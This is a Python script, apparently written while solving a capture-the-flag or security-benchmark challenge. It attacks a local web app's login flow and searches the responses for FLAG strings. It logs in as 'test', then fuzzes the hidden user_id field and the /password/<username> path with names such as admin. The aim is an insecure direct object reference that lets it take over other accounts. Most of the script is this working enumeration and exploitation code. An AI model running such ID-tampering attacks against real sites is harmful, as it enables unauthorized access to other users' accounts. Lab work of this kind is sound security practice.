import requests
import re

BASE_URL = "http://127.0.0.1:32929"
TIMEOUT = 5

FLAG_REGEX = re.compile(r"FLAG\{[^}]+\}")


def print_response_context(label, resp):
    print(f"[+] {label} | Status: {resp.status_code} | URL: {resp.url} | Length: {len(resp.content)}")
    cookies_dict = requests.utils.dict_from_cookiejar(resp.cookies)
    if cookies_dict:
        print(f"[+] {label} Cookies: {cookies_dict}")
    text = resp.text
    flags = FLAG_REGEX.findall(text)
    if flags:
        print(f"[!] {label} FLAGS: {flags}")
    # Print a small snippet around first FLAG if exists, else first 300 chars for context
    if flags:
        first_flag = flags[0]
        idx = text.find(first_flag)
        start = max(0, idx - 100)
        end = min(len(text), idx + len(first_flag) + 100)
        print(f"[+] {label} Context around FLAG:\n{text[start:end]}")
    else:
        snippet = text[:300]
        print(f"[+] {label} Body snippet:\n{snippet}")


def main():
    s = requests.Session()

    baseline_info = {
        "step1": None,
        "step2": None,
        "step3": None,
        "success": False,
    }

    try:
        # Step 1: Initial GET
        resp1 = s.get(f"{BASE_URL}/", timeout=TIMEOUT, allow_redirects=True)
        print_response_context("Baseline STEP1 GET /", resp1)
        baseline_info["step1"] = {
            "status": resp1.status_code,
            "url": resp1.url,
        }
    except Exception as e:
        print(f"[ERROR] Baseline STEP1 GET / failed: {e}")

    try:
        # Step 2: POST username only
        data2 = {"username": "test"}
        resp2 = s.post(f"{BASE_URL}/", data=data2, timeout=TIMEOUT, allow_redirects=True)
        print_response_context("Baseline STEP2 POST / username=test", resp2)
        baseline_info["step2"] = {
            "status": resp2.status_code,
            "url": resp2.url,
        }
    except Exception as e:
        print(f"[ERROR] Baseline STEP2 POST / failed: {e}")

    try:
        # Step 3: POST to /password/test with known creds
        data3 = {"username": "test", "user_id": "10032", "password": "test"}
        resp3 = s.post(f"{BASE_URL}/password/test", data=data3, timeout=TIMEOUT, allow_redirects=True)
        print_response_context("Baseline STEP3 POST /password/test", resp3)
        baseline_info["step3"] = {
            "status": resp3.status_code,
            "url": resp3.url,
        }
        # Heuristic: consider baseline success if 200 and contains 'Welcome' or similar
        text3_lower = resp3.text.lower()
        if resp3.status_code == 200 and ("welcome" in text3_lower or "logged" in text3_lower or "password" in text3_lower):
            baseline_info["success"] = True
    except Exception as e:
        print(f"[ERROR] Baseline STEP3 POST /password/test failed: {e}")

    print("\n[SUMMARY] Baseline login info:")
    print(baseline_info)

    # 2a) user_id fuzzing on /password/test
    print("\n[PHASE] user_id fuzzing on /password/test")
    fuzz_results = []
    base_id = 10032
    for offset in range(-5, 6):  # -5..5
        fuzz_id = base_id + offset
        label = f"Fuzz user_id={fuzz_id} (offset {offset})"
        try:
            data = {"username": "test", "user_id": str(fuzz_id), "password": "test"}
            resp = s.post(f"{BASE_URL}/password/test", data=data, timeout=TIMEOUT, allow_redirects=True)
            print_response_context(label, resp)
            body = resp.text
            flags = FLAG_REGEX.findall(body)
            # extract small error or username change snippet
            snippet = ""
            for marker in ["error", "invalid", "welcome", "user", "username", "password"]:
                idx = body.lower().find(marker)
                if idx != -1:
                    start = max(0, idx - 60)
                    end = min(len(body), idx + 60)
                    snippet = body[start:end]
                    break
            fuzz_results.append({
                "user_id": fuzz_id,
                "status": resp.status_code,
                "url": resp.url,
                "flags": flags,
                "snippet": snippet if snippet else body[:120],
            })
        except Exception as e:
            print(f"[ERROR] {label} failed: {e}")
            fuzz_results.append({
                "user_id": fuzz_id,
                "error": str(e),
            })

    # 2b) Path-embedded username fuzzing
    print("\n[PHASE] /password/<username> fuzzing")
    usernames = ["test", "admin", "john", "mary", "user", "guest", "demo"]
    user_fuzz_results = []

    for name in usernames:
        get_label = f"GET /password/{name}"
        post_label = f"POST /password/{name} with user_id=10032 password=test"
        get_entry = {"username": name}
        post_entry = {"username": name}

        # GET phase
        try:
            resp_get = s.get(f"{BASE_URL}/password/{name}", timeout=TIMEOUT, allow_redirects=True)
            print_response_context(get_label, resp_get)
            body_get = resp_get.text
            flags_get = FLAG_REGEX.findall(body_get)
            has_hidden_user_id = ("type=\"hidden\"" in body_get and "user_id" in body_get)
            get_entry.update({
                "get_status": resp_get.status_code,
                "get_url": resp_get.url,
                "get_flags": flags_get,
                "get_has_hidden_user_id": has_hidden_user_id,
            })
        except Exception as e:
            print(f"[ERROR] {get_label} failed: {e}")
            get_entry.update({"get_error": str(e)})

        # POST phase (optional but requested)
        try:
            data_post = {"username": name, "user_id": "10032", "password": "test"}
            resp_post = s.post(f"{BASE_URL}/password/{name}", data=data_post, timeout=TIMEOUT, allow_redirects=True)
            print_response_context(post_label, resp_post)
            body_post = resp_post.text
            flags_post = FLAG_REGEX.findall(body_post)
            snippet = ""
            for marker in ["error", "invalid", "welcome", "user", "username", "password"]:
                idx = body_post.lower().find(marker)
                if idx != -1:
                    start = max(0, idx - 60)
                    end = min(len(body_post), idx + 60)
                    snippet = body_post[start:end]
                    break
            post_entry.update({
                "post_status": resp_post.status_code,
                "post_url": resp_post.url,
                "post_flags": flags_post,
                "post_snippet": snippet if snippet else body_post[:120],
            })
        except Exception as e:
            print(f"[ERROR] {post_label} failed: {e}")
            post_entry.update({"post_error": str(e)})

        # Combine get/post info for this username
        combined = {**get_entry, **post_entry}
        user_fuzz_results.append(combined)

    # 3) Structured summary
    print("\n[STRUCTURED SUMMARY]")
    print("Baseline:")
    print(baseline_info)

    print("\nuser_id fuzzing results (offset -5..5):")
    for r in fuzz_results:
        if "error" in r:
            print(f"user_id={r['user_id']} | ERROR: {r['error']}")
            continue
        print(f"user_id={r['user_id']} | status={r['status']} | url={r['url']} | flags={r['flags']} | snippet={r['snippet'].replace('\n', ' ')}")

    print("\n/password/<username> fuzzing results:")
    for r in user_fuzz_results:
        print(f"username={r.get('username')} | GET_status={r.get('get_status')} | GET_url={r.get('get_url')} | hidden_user_id={r.get('get_has_hidden_user_id')} | GET_flags={r.get('get_flags')} | POST_status={r.get('post_status')} | POST_url={r.get('post_url')} | POST_flags={r.get('post_flags')} | POST_snippet={(r.get('post_snippet') or '').replace('\n', ' ')}")

    # Final pass: if any FLAGs were printed, they are already in stdout as required


if __name__ == "__main__":
    main()

